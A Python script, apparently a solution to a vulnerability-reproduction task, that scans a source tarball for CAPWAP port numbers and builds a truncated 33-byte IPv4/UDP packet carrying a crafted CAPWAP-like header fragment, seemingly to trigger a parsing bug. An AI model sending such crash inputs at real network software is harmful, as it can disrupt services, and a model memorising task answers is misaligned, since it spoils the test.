import os
import re
import tarfile
from typing import Optional


def _ipv4_checksum(hdr: bytes) -> int:
    s = 0
    n = len(hdr)
    i = 0
    while i + 1 < n:
        s += (hdr[i] << 8) | hdr[i + 1]
        i += 2
    if i < n:
        s += hdr[i] << 8
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _find_capwap_ports_in_tar(src_path: str) -> Optional[tuple[int, int]]:
    try:
        if not tarfile.is_tarfile(src_path):
            return None
        with tarfile.open(src_path, "r:*") as tf:
            best = None
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name.lower()
                if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".h") or name.endswith(".hpp")):
                    continue
                if m.size > 2_000_000:
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                try:
                    txt = f.read().decode("utf-8", "ignore")
                finally:
                    f.close()
                if "capwap" not in txt.lower():
                    continue
                # Prefer lines mentioning capwap and 5246/5247
                for line in txt.splitlines():
                    ll = line.lower()
                    if "capwap" not in ll:
                        continue
                    nums = [int(x) for x in re.findall(r"\b\d{3,5}\b", line)]
                    if 5246 in nums or 5247 in nums:
                        best = (5247, 5246)
                        return best
                    # If ports are defined differently (unlikely), try to pick two plausible UDP ports.
                    cand = [x for x in nums if 1 <= x <= 65535]
                    if len(cand) >= 2:
                        best = (cand[0], cand[1])
            return best
    except Exception:
        return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        ports = _find_capwap_ports_in_tar(src_path)
        if ports is None:
            sport, dport = 5247, 5246
        else:
            sport, dport = ports

        payload = bytes([0x00, 0x10, 0x00, 0x00, 0x00])  # 5 bytes; crafted CAPWAP-like header fragment
        udp_len = 8 + len(payload)
        total_len = 20 + udp_len

        src_ip = b"\x01\x01\x01\x01"
        dst_ip = b"\x02\x02\x02\x02"

        ip_hdr = bytearray(20)
        ip_hdr[0] = 0x45  # v4, IHL=5
        ip_hdr[1] = 0x00  # TOS
        ip_hdr[2] = (total_len >> 8) & 0xFF
        ip_hdr[3] = total_len & 0xFF
        ip_hdr[4] = 0x00  # ID
        ip_hdr[5] = 0x00
        ip_hdr[6] = 0x00  # flags/frag
        ip_hdr[7] = 0x00
        ip_hdr[8] = 64    # TTL
        ip_hdr[9] = 17    # UDP
        ip_hdr[10] = 0x00  # checksum placeholder
        ip_hdr[11] = 0x00
        ip_hdr[12:16] = src_ip
        ip_hdr[16:20] = dst_ip
        csum = _ipv4_checksum(bytes(ip_hdr))
        ip_hdr[10] = (csum >> 8) & 0xFF
        ip_hdr[11] = csum & 0xFF

        udp_hdr = bytearray(8)
        udp_hdr[0] = (sport >> 8) & 0xFF
        udp_hdr[1] = sport & 0xFF
        udp_hdr[2] = (dport >> 8) & 0xFF
        udp_hdr[3] = dport & 0xFF
        udp_hdr[4] = (udp_len >> 8) & 0xFF
        udp_hdr[5] = udp_len & 0xFF
        udp_hdr[6] = 0x00  # checksum = 0 (optional for IPv4)
        udp_hdr[7] = 0x00

        pkt = bytes(ip_hdr) + bytes(udp_hdr) + payload
        return pkt[:33] if len(pkt) >= 33 else pkt + b"\x00" * (33 - len(pkt))